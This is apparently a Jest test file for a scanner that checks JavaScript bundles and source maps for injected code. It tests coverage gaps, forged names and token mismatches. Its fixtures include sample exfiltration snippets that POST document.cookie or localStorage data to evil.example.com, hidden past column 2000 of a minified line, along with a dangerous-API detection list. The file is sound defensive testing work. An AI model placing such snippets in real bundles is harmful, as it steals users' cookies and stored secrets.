import { encode, type SourceMapSegment } from "@jridgewell/sourcemap-codec";
import { TraceMap, type SourceMapInput } from "@jridgewell/trace-mapping";
import { EngineRunResults, Workspace } from "@salesforce/code-analyzer-engine-api";
import * as path from "node:path";
import { UIBundleEngine } from "../src/engine";
import {
    containsDangerousApi,
    containsDangerousPattern,
    isAsset,
    isDependency,
    isVirtualSource,
    normalizeSourcePath,
} from "../src/validators/classification";
import { analyzeCoverage, validateCoverageAnalysis } from "../src/validators/coverage-analysis";
import { validateInvalidSourceReferences } from "../src/validators/invalid-source-references";
import { validateMissingSourcemaps } from "../src/validators/missing-sourcemap";
import { validatePathLeakage } from "../src/validators/path-leakage";
import { validateSourceContent } from "../src/validators/source-content-verification";
import {
    analyzeCoherence,
    pointsToWhitespaceOrComment,
    validateStructuralCoherence,
} from "../src/validators/structural-coherence";
import {
    analyzeTokenConsistency,
    classifyTokenAt,
    validateTokenConsistency,
} from "../src/validators/token-consistency";
import { validateVlqIntegrity } from "../src/validators/vlq-integrity";
import { changeWorkingDirectoryToPackageRoot, createRunOptions, installTmpDirCleanup, makeTmpDir, writeFile } from "./test-helpers";

changeWorkingDirectoryToPackageRoot();
installTmpDirCleanup();

describe('classification', () => {
    it('normalizes leading dot-slash and dot-dot segments and bundler URL schemes', () => {
        expect(normalizeSourcePath('./src/foo.js')).toEqual('src/foo.js');
        expect(normalizeSourcePath('../src/foo.js')).toEqual('src/foo.js');
        expect(normalizeSourcePath('/src/foo.js')).toEqual('src/foo.js');
        expect(normalizeSourcePath('webpack:///src/foo.js')).toEqual('src/foo.js');
        expect(normalizeSourcePath('webpack://src/foo.js')).toEqual('src/foo.js');
    });

    it('identifies virtual, dependency, and asset sources', () => {
        // The virtual predicate hits on bundler-runtime prefixes and query-string embellishments.
        expect(isVirtualSource('webpack/runtime/hasOwnProperty')).toEqual(true);
        expect(isVirtualSource('vite/dist/client/env.mjs')).toEqual(true);
        expect(isVirtualSource('src/x.js?vue&type=script')).toEqual(true);
        expect(isVirtualSource('src/x.js')).toEqual(false);
        expect(isDependency('node_modules/foo/index.js')).toEqual(true);
        expect(isDependency('packages/pkg/node_modules/foo/index.js')).toEqual(true);
        expect(isDependency('src/x.js')).toEqual(false);
        expect(isAsset('logo.png')).toEqual(true);
        expect(isAsset('src/x.ts')).toEqual(false);
    });

    it('flags dangerous API patterns in code and dangerous-only extras', () => {
        // Detects known API-scan strings (e.g. eval/Function tokens are stored split at rest).
        expect(containsDangerousApi('document.cookie = "x=1"')).toEqual(true);
        expect(containsDangerousApi('localStorage.setItem("a", "b")')).toEqual(true);
        expect(containsDangerousApi('const a = 1;')).toEqual(false);

        // AST-extra patterns catch bundler-safe helpers plus the base set.
        expect(containsDangerousPattern('fetch("https://x")')).toEqual(true);
        expect(containsDangerousPattern('doc.createElement("script")')).toEqual(true);
        expect(containsDangerousPattern('normal function foo() {}')).toEqual(false);
    });
});

describe('analyzeCoverage', () => {
    function makeTraceMapWithCoverage(mappings: SourceMapSegment[][]): TraceMap {
        const encoded = encode(mappings);
        return new TraceMap({
            version: 3,
            sources: ['../src/main.js'],
            names: [],
            mappings: encoded,
        } as SourceMapInput);
    }

    it('flags a long fully-unmapped line as an unmapped region', () => {
        const tracer = makeTraceMapWithCoverage([[]]);
        const compiled = 'a'.repeat(60) + '\n';
        const report = analyzeCoverage(tracer, compiled);
        expect(report.unmappedRegions.length).toBeGreaterThan(0);
        expect(report.unmappedRegions[0]!.length).toBeGreaterThanOrEqual(50);
    });

    it('does not flag a short line', () => {
        const tracer = makeTraceMapWithCoverage([[]]);
        const compiled = 'short\n';
        const report = analyzeCoverage(tracer, compiled);
        expect(report.unmappedRegions).toHaveLength(0);
    });

    it('exempts up to 150 chars on line 1 when computing excessive-unmapped budget', () => {
        // line 1 is fully unmapped but only 100 chars — should NOT count toward budget.
        const tracer = makeTraceMapWithCoverage([[]]);
        const compiled = 'a'.repeat(100) + '\n';
        const report = analyzeCoverage(tracer, compiled);
        expect(report.excessiveUnmapped).toEqual(false);
    });

    it('does not over-credit a minified line with a single mapping at column 0', () => {
        // A single mapping cannot silently credit the whole line — anything past the
        // per-mapping reach must be flagged unmapped and reduce mappedChars.
        const tracer = makeTraceMapWithCoverage([[[0, 0, 0, 0]]]);
        const lineLen = 100000;
        const compiled = 'a'.repeat(lineLen);
        const report = analyzeCoverage(tracer, compiled);
        expect(report.coveragePct).toBeLessThan(50);
        expect(report.unmappedRegions.length).toBeGreaterThan(0);
    });

    it('dense single-line output tolerates small ambient gaps (structural, not tamper)', () => {
        // Dense minified line: a mapping every ~50 chars over 6000 chars — none of those
        // ~50-char gaps should be flagged. Ambient bundler shape, not injected code.
        const segments: SourceMapSegment[] = [];
        for (let i = 0; i < 120; i++) {
            segments.push([i * 50, 0, 0, i]);
        }
        const tracer = makeTraceMapWithCoverage([segments]);
        const compiled = 'a'.repeat(6000);
        const report = analyzeCoverage(tracer, compiled);
        expect(report.unmappedRegions).toHaveLength(0);
    });

    it('REGRESSION: dense single-line still flags a substantial (>=2000-char) unmapped gap', () => {
        // Same shape as above, but with a ~2500-char gap in the middle. This is the
        // "injected block" case on dense minified output — must still fire.
        const segments: SourceMapSegment[] = [];
        for (let i = 0; i < 60; i++) segments.push([i * 50, 0, 0, i]);
        // skip cols 3000..5500 → no mapping in that window
        for (let i = 0; i < 100; i++) segments.push([5500 + i * 50, 0, 0, 60 + i]);
        const tracer = makeTraceMapWithCoverage([segments]);
        const compiled = 'a'.repeat(11000);
        const report = analyzeCoverage(tracer, compiled);
        const injected = report.unmappedRegions.find(r => r.length >= 2000);
        expect(injected).toBeDefined();
    });

    it('dense single-line tolerates ambient gaps under 2000 chars', () => {
        // Ambient gap of ~1500 chars on a dense minified line should now be tolerated.
        // Smaller injections are caught by source-content-verification, not this rule.
        const segments: SourceMapSegment[] = [];
        for (let i = 0; i < 60; i++) segments.push([i * 50, 0, 0, i]);
        for (let i = 0; i < 100; i++) segments.push([4500 + i * 50, 0, 0, 60 + i]);
        const tracer = makeTraceMapWithCoverage([segments]);
        const compiled = 'a'.repeat(10000);
        const report = analyzeCoverage(tracer, compiled);
        expect(report.unmappedRegions).toHaveLength(0);
    });

    it('REGRESSION: short multi-line output still uses the 50-char threshold', () => {
        // Non-minified shape: fully-unmapped 80-char second line must still fire.
        const tracer = makeTraceMapWithCoverage([[]]);
        const compiled = 'short\n' + 'a'.repeat(80) + '\n';
        const report = analyzeCoverage(tracer, compiled);
        expect(report.unmappedRegions.some(r => r.line === 2)).toBe(true);
    });
});

describe('validateCoverageAnalysis emission cap', () => {
    it('caps per-file region emissions to the top 5 by size, always including the largest', async () => {
        const tmp = makeTmpDir();
        // Craft a dist file where 10 substantial unmapped regions exist on a dense line.
        // The engine must emit at most 5 findings, and must include the largest one.
        const segments: SourceMapSegment[] = [];
        const gaps = [2100, 2200, 2400, 2500, 2600, 2700, 8000, 2900, 3000, 3100];
        let pos = 0;
        for (const gap of gaps) {
            segments.push([pos, 0, 0, pos]);
            pos += gap;
            segments.push([pos, 0, 0, pos]);
            pos += 100;
        }
        writeFile(tmp, 'dist/main.js', 'a'.repeat(pos + 100));
        writeFile(tmp, 'dist/main.js.map', JSON.stringify({
            version: 3,
            sources: ['../src/main.js'],
            names: [],
            mappings: encode([segments]),
        }));
        const res = await validateCoverageAnalysis(path.join(tmp, 'dist'));
        const regionFindings = res.findings.filter(f => f.message.startsWith('Unmapped region'));
        expect(regionFindings.length).toBeLessThanOrEqual(5);
        // The largest region (~7950 chars, after subtracting the 50-char mapping reach)
        // must be represented in the emitted set — cap must not drop the biggest gap.
        const sizes = regionFindings.map((f: { message: string }) => {
            const m = f.message.match(/\((\d+) chars\)/);
            return m ? Number(m[1]) : 0;
        });
        expect(Math.max(...sizes)).toBeGreaterThanOrEqual(7000);
    });
});

describe('pointsToWhitespaceOrComment', () => {
    it('detects whitespace-only after column', () => {
        // Points into a run of trailing whitespace with no non-whitespace after it.
        expect(pointsToWhitespaceOrComment('let x = 1;    ', 0, 11)).toEqual(true);
    });
    it('detects line comment prefix', () => {
        expect(pointsToWhitespaceOrComment('// hello', 0, 0)).toEqual(true);
    });
    it('detects block comment prefix', () => {
        expect(pointsToWhitespaceOrComment('/* hello */', 0, 0)).toEqual(true);
    });
    it('returns false on a real identifier', () => {
        expect(pointsToWhitespaceOrComment('let x = 1;', 0, 4)).toEqual(false);
    });
});

describe('classifyTokenAt', () => {
    it('recognizes strings, numbers, identifiers, and punctuation', () => {
        expect(classifyTokenAt('"a"', 0, 0)).toEqual('StringLiteral');
        expect(classifyTokenAt("'a'", 0, 0)).toEqual('StringLiteral');
        expect(classifyTokenAt('`a`', 0, 0)).toEqual('StringLiteral');
        expect(classifyTokenAt('42', 0, 0)).toEqual('NumericLiteral');
        expect(classifyTokenAt('foo', 0, 0)).toEqual('Identifier');
        expect(classifyTokenAt('{', 0, 0)).toEqual('Punctuation');
        expect(classifyTokenAt(' ', 0, 0)).toEqual('Other');
        expect(classifyTokenAt('', 0, 0)).toEqual('Other');
        expect(classifyTokenAt('abc', 5, 0)).toEqual('Other');
    });
});

describe('analyzeCoherence', () => {
    it('reports zero bounds violations for an in-range mapping', () => {
        // Mapping [[[0,0,0,0]]] → generated line 1 col 0 → src 0 line 0 col 0
        const mapJson = {
            version: 3,
            sources: ['../src/main.js'],
            names: [],
            mappings: encode([[[0, 0, 0, 0]]]),
        };
        const tracer = new TraceMap(mapJson as SourceMapInput);
        const src = new Map<string, string>([['src/main.js', 'let x = 1;\nlet y = 2;\n']]);
        const report = analyzeCoherence(tracer, src);
        expect(report.totalMappingsChecked).toEqual(1);
        expect(report.boundsViolations).toHaveLength(0);
    });

    it('reports a bounds violation when the mapping claims a line past EOF', () => {
        // Segment [0,0,99,0] → src file line index 99 which does not exist.
        const mapJson = {
            version: 3,
            sources: ['../src/main.js'],
            names: [],
            mappings: encode([[[0, 0, 99, 0]]]),
        };
        const tracer = new TraceMap(mapJson as SourceMapInput);
        const src = new Map<string, string>([['src/main.js', 'let x = 1;\n']]);
        const report = analyzeCoherence(tracer, src);
        expect(report.boundsViolations.length).toBeGreaterThan(0);
    });
});

describe('analyzeTokenConsistency', () => {
    it('returns a perfect score when compiled and source tokens agree', () => {
        // Both sides point to identifiers.
        const mapJson = {
            version: 3,
            sources: ['../src/main.js'],
            names: [],
            mappings: encode([[[0, 0, 0, 0]]]),
        };
        const tracer = new TraceMap(mapJson as SourceMapInput);
        const compiled = 'foo';
        const src = new Map<string, string>([['src/main.js', 'foo']]);
        const report = analyzeTokenConsistency(tracer, compiled, src);
        expect(report.totalSampled).toEqual(1);
        expect(report.consistencyScore).toEqual(1);
    });

    it('suppresses jsx-runtime synthetic name mismatches on .tsx sources', () => {
        // Vite JSX transform emits `_jsx` at compiled pos, but source at claimed pos is `<`.
        // With suppression, this whole sample should be excluded from the score.
        const mapJson = {
            version: 3,
            sources: ['../src/App.tsx'],
            names: ['jsx'],
            mappings: encode([[[0, 0, 0, 0, 0]]]),
        };
        const tracer = new TraceMap(mapJson as SourceMapInput);
        const compiled = '_jsx(Foo)';
        const src = new Map<string, string>([['src/App.tsx', '<Foo />']]);
        const report = analyzeTokenConsistency(tracer, compiled, src);
        expect(report.nameMismatches).toHaveLength(0);
        expect(report.totalSampled).toEqual(0);
    });

    it('REGRESSION: does NOT suppress a fabricated non-jsx name on a .tsx source', () => {
        // Attacker forges the name "adminOverride" pointing at a .tsx position that
        // doesn't contain that identifier. Must still fire — suppression is name-scoped.
        const mapJson = {
            version: 3,
            sources: ['../src/App.tsx'],
            names: ['adminOverride'],
            mappings: encode([[[0, 0, 0, 0, 0]]]),
        };
        const tracer = new TraceMap(mapJson as SourceMapInput);
        const compiled = 'x';
        const src = new Map<string, string>([['src/App.tsx', '<Foo />']]);
        const report = analyzeTokenConsistency(tracer, compiled, src);
        expect(report.nameMismatches.length).toBeGreaterThan(0);
        expect(report.nameMismatches[0]!.expectedName).toEqual('adminOverride');
    });

    it('REGRESSION: does NOT suppress a jsx-runtime name on a non-JSX source', () => {
        // Same synthetic name but the source is `.js` — attacker cannot hide behind
        // JSX-runtime suppression on a plain JS file.
        const mapJson = {
            version: 3,
            sources: ['../src/main.js'],
            names: ['jsx'],
            mappings: encode([[[0, 0, 0, 0, 0]]]),
        };
        const tracer = new TraceMap(mapJson as SourceMapInput);
        const compiled = 'x';
        const src = new Map<string, string>([['src/main.js', 'const y = 1;']]);
        const report = analyzeTokenConsistency(tracer, compiled, src);
        expect(report.nameMismatches.length).toBeGreaterThan(0);
        expect(report.nameMismatches[0]!.expectedName).toEqual('jsx');
    });

    it('suppresses namespace-prefix name mismatches (Radix-style)', () => {
        // Bundler emits qualified name "SelectPrimitive.Viewport" but sourcemap points at
        // the container identifier. Legitimate structural pattern — no finding expected.
        const mapJson = {
            version: 3,
            sources: ['../src/ui/select.tsx'],
            names: ['SelectPrimitive.Viewport'],
            mappings: encode([[[0, 0, 0, 0, 0]]]),
        };
        const tracer = new TraceMap(mapJson as SourceMapInput);
        const compiled = 'SelectPrimitive.Viewport';
        const src = new Map<string, string>([['src/ui/select.tsx', 'SelectPrimitive']]);
        const report = analyzeTokenConsistency(tracer, compiled, src);
        expect(report.nameMismatches).toHaveLength(0);
    });

    it('REGRESSION: does NOT suppress a qualified name whose left segment is wrong', () => {
        // Attacker forges "AdminOverride.execute" at a position holding "PublicApi".
        // Found text ≠ leftmost segment → suppression does not apply → must fire.
        const mapJson = {
            version: 3,
            sources: ['../src/ui/select.tsx'],
            names: ['AdminOverride.execute'],
            mappings: encode([[[0, 0, 0, 0, 0]]]),
        };
        const tracer = new TraceMap(mapJson as SourceMapInput);
        const compiled = 'x';
        const src = new Map<string, string>([['src/ui/select.tsx', 'PublicApi.method']]);
        const report = analyzeTokenConsistency(tracer, compiled, src);
        expect(report.nameMismatches.length).toBeGreaterThan(0);
        expect(report.nameMismatches[0]!.expectedName).toEqual('AdminOverride.execute');
    });

    it('REGRESSION: does NOT suppress a single-segment mismatch', () => {
        // Ordinary (non-qualified) name mismatch: no '.' in expected → suppression must
        // not apply. Attacker-forged unrelated identifiers stay caught.
        const mapJson = {
            version: 3,
            sources: ['../src/ui/select.tsx'],
            names: ['stealth'],
            mappings: encode([[[0, 0, 0, 0, 0]]]),
        };
        const tracer = new TraceMap(mapJson as SourceMapInput);
        const compiled = 'x';
        const src = new Map<string, string>([['src/ui/select.tsx', 'legit_var = 1;']]);
        const report = analyzeTokenConsistency(tracer, compiled, src);
        expect(report.nameMismatches.length).toBeGreaterThan(0);
    });
});

describe('End-to-end validator dispatch (all rules together)', () => {
    it('dispatches all 8 rules against a fully-populated bundle without crashing', async () => {
        const engine = new UIBundleEngine();
        const tmp = makeTmpDir();
        writeFile(tmp, 'ui-bundle.json', '{}');

        const src = 'export const answer = 42;\n';
        const compiled = 'export const answer = 42;\n//# sourceMappingURL=main.js.map\n';
        writeFile(tmp, 'src/main.js', src);
        writeFile(tmp, 'dist/main.js', compiled);
        writeFile(tmp, 'dist/main.js.map', JSON.stringify({
            version: 3,
            sources: ['../src/main.js'],
            sourcesContent: [src],
            names: [],
            mappings: encode([[[0, 0, 0, 0]]]),
        }));

        const results: EngineRunResults = await engine.runRules(
            [
                'missing-sourcemap',
                'path-leakage',
                'invalid-source-references',
                'vlq-integrity',
                'source-content-verification',
                'coverage-analysis',
                'structural-coherence',
                'token-consistency',
            ],
            createRunOptions(new Workspace('id', [tmp])),
        );
        // Every violation should carry 1-based coordinates and be one of the 8 rule names.
        for (const v of results.violations) {
            expect([
                'missing-sourcemap',
                'path-leakage',
                'invalid-source-references',
                'vlq-integrity',
                'source-content-verification',
                'coverage-analysis',
                'structural-coherence',
                'token-consistency',
            ]).toContain(v.ruleName);
            expect(v.codeLocations[0]!.startLine).toBeGreaterThanOrEqual(1);
            expect(v.codeLocations[0]!.startColumn).toBeGreaterThanOrEqual(1);
        }
    });

    it('validators handle missing input paths gracefully', async () => {
        const missing = path.join(makeTmpDir(), 'does-not-exist');

        // Dist-only walkers silently return an empty result set for missing dirs.
        const missingRef = await validateInvalidSourceReferences(missing);
        expect(missingRef.findings).toEqual([]);
        const missingLeak = await validatePathLeakage(missing);
        expect(missingLeak.findings).toEqual([]);
        const missingVlq = await validateVlqIntegrity(missing);
        expect(missingVlq.findings).toEqual([]);

        // Explicit-stat validators emit a `skipped` reason instead.
        const missingMap = await validateMissingSourcemaps(missing);
        expect(missingMap.skipped).toBeDefined();
        const missingCoverage = await validateSourceContent({ sourcePath: missing, distPath: missing });
        expect(missingCoverage.skipped).toBeDefined();
        const missingCoh = await validateStructuralCoherence({ sourcePath: missing, distPath: missing });
        expect(missingCoh.skipped).toBeDefined();
        const missingTok = await validateTokenConsistency({ sourcePath: missing, distPath: missing });
        expect(missingTok.skipped).toBeDefined();
    });
});

describe('BACKSTOP: source-content-verification catches injections coverage-analysis now tolerates', () => {
    it('flags a dangerous unmapped call-expression past col 2000 on line 1 (single-line minified bundle)', async () => {
        const tmp = makeTmpDir();
        const src = 'export const answer = 42;\n';
        // Craft a single-line compiled JS. Prepend 2500 chars of benign filler, then embed
        // an unmapped fetch() call past col 2500 (so it's past LINE1_BANNER_EXEMPT_CHARS).
        const filler = 'const x' + 'y'.repeat(2400) + ' = 1;';
        const evilFragment = 'function __exfil(){fetch("https://evil.example.com/collect",{method:"POST",body:document.cookie});}';
        const compiled = filler + evilFragment + '\n//# sourceMappingURL=main.js.map\n';
        writeFile(tmp, 'src/main.js', src);
        writeFile(tmp, 'dist/main.js', compiled);
        // Mappings: legitimate mapping at col 0, then a "reset" segment (1-value) at
        // col 500 that explicitly unmaps the rest of the line. Real vite/webpack bundles
        // use this pattern in minified output — the injected code past col 2000 will hit
        // the `unmapped` branch in runAstChecks.
        writeFile(tmp, 'dist/main.js.map', JSON.stringify({
            version: 3,
            sources: ['../src/main.js'],
            sourcesContent: [src],
            names: [],
            mappings: encode([[[0, 0, 0, 0], [500]]]),
        }));

        const res = await validateSourceContent({ sourcePath: path.join(tmp, 'src'), distPath: path.join(tmp, 'dist') });
        const dangerous = res.findings.filter(f => /dangerous API pattern/i.test(f.message));
        expect(dangerous.length).toBeGreaterThan(0);
    });

    it('EXEMPT: the same dangerous code within the first 2000 cols of line 1 is NOT flagged', async () => {
        const tmp = makeTmpDir();
        const src = 'export const answer = 42;\n';
        // Same fragment but positioned inside the LINE1_BANNER_EXEMPT_CHARS (2000) window.
        // The fetch CallExpression lands near col 48. The map has a real mapping at col 0
        // then a *reset* segment at col 5, so col 48 is genuinely unmapped — the node
        // reaches the dangerousUnmapped filter and is dropped ONLY by the exemption
        // (column < LINE1_BANNER_EXEMPT_CHARS). Asserts the exemption is what saves it,
        // not accidental full-line mapping coverage.
        const compiled = 'var __bundlerRuntime__=' + 'function __benignFetch(){fetch("/api/health");}' + 'x'.repeat(500) + '\n//# sourceMappingURL=main.js.map\n';
        writeFile(tmp, 'src/main.js', src);
        writeFile(tmp, 'dist/main.js', compiled);
        writeFile(tmp, 'dist/main.js.map', JSON.stringify({
            version: 3,
            sources: ['../src/main.js'],
            sourcesContent: [src],
            names: [],
            mappings: encode([[[0, 0, 0, 0], [5]]]),
        }));

        const res = await validateSourceContent({ sourcePath: path.join(tmp, 'src'), distPath: path.join(tmp, 'dist') });
        const dangerous = res.findings.filter(f => /dangerous API pattern/i.test(f.message));
        expect(dangerous).toHaveLength(0);
    });
});

describe('BACKSTOP: coverage-analysis cumulative-budget catches many small sub-threshold gaps', () => {
    it('flags excessive-cumulative when 10 sub-threshold gaps aggregate past 5%', () => {
        // Dense single line (>5000 chars) with 10 gaps of ~800 chars each. Each gap is
        // below DENSE_LINE_UNMAPPED_THRESHOLD=2000 so no region is emitted, but their
        // aggregate must count against the cumulative-budget signal.
        const segments: SourceMapSegment[] = [];
        // Layout: for i in 0..10, a mapping at col base_i, then a mapping at base_i + 850.
        // Between them a ~800-char gap (with 50 credited to the previous mapping).
        let col = 0;
        for (let i = 0; i < 10; i++) {
            segments.push([col, 0, 0, i * 2]);
            col += 850;
            segments.push([col, 0, 0, i * 2 + 1]);
            col += 200;
        }
        const tracer = new TraceMap({
            version: 3,
            sources: ['../src/main.js'],
            names: [],
            mappings: encode([segments]),
        });
        const compiled = 'a'.repeat(col + 100);
        const report = analyzeCoverage(tracer, compiled);
        // No per-region emissions on a dense line for gaps this small.
        expect(report.unmappedRegions).toHaveLength(0);
        // But the cumulative signal must fire: ~10 × 800 = 8000 uncounted chars on ~10500
        // total → ~76% (dominated by the 2000-char preamble exemption pushing the ratio up).
        expect(report.excessiveUnmapped).toBe(true);
    });

    it('EXEMPT: a single 800-char sub-threshold gap alone does NOT trip cumulative-budget', () => {
        // One small gap on an otherwise well-mapped dense line — must stay below 5%.
        const segments: SourceMapSegment[] = [];
        // Mappings densely from col 0 to col 20000 in 50-char steps, then a single 800-char
        // gap, then continue densely. That's ~800/20800 = 3.8% — below the 5% threshold.
        for (let i = 0; i < 400; i++) segments.push([i * 50, 0, 0, i]);
        for (let i = 0; i < 400; i++) segments.push([20800 + i * 50, 0, 0, 400 + i]);
        const tracer = new TraceMap({
            version: 3,
            sources: ['../src/main.js'],
            names: [],
            mappings: encode([segments]),
        });
        const compiled = 'a'.repeat(40800);
        const report = analyzeCoverage(tracer, compiled);
        expect(report.unmappedRegions).toHaveLength(0);
        expect(report.excessiveUnmapped).toBe(false);
    });
});

describe('BACKSTOP: source-content-verification catches injection even when token-consistency is suppressed', () => {
    it('detects dangerous unmapped code even if the sourcemap tags it with a jsx-runtime name on a .tsx source', async () => {
        const tmp = makeTmpDir();
        const src = '<Foo />\n';
        // Attacker prepends a fake "safe" mapping at (line 1, col 0) pointing at a .tsx
        // file with name "jsx" (which our token-consistency now suppresses). The rest of
        // line 1 contains an unmapped dangerous call past col 2000.
        const filler = 'var _s=' + '"x".repeat(2100)' + ';var _p=' + JSON.stringify('a'.repeat(2000)) + ';';
        const evilFragment = 'function __exfil(){fetch("https://evil.example.com",{method:"POST",body:localStorage.getItem("k")});}';
        const compiled = filler + evilFragment + '\n//# sourceMappingURL=main.js.map\n';
        writeFile(tmp, 'src/App.tsx', src);
        writeFile(tmp, 'dist/main.js', compiled);
        writeFile(tmp, 'dist/main.js.map', JSON.stringify({
            version: 3,
            sources: ['../src/App.tsx'],
            sourcesContent: [src],
            names: ['jsx'],
            // Named mapping at col 0, then an unmapping "reset" segment at col 500 —
            // rest of the line is explicitly unmapped, exposing the injected code past
            // col 2000 to the source-content-verification dangerous-pattern scan.
            mappings: encode([[[0, 0, 0, 0, 0], [500]]]),
        }));

        const res = await validateSourceContent({ sourcePath: path.join(tmp, 'src'), distPath: path.join(tmp, 'dist') });
        const dangerous = res.findings.filter(f => /dangerous API pattern/i.test(f.message));
        expect(dangerous.length).toBeGreaterThan(0);
    });
});
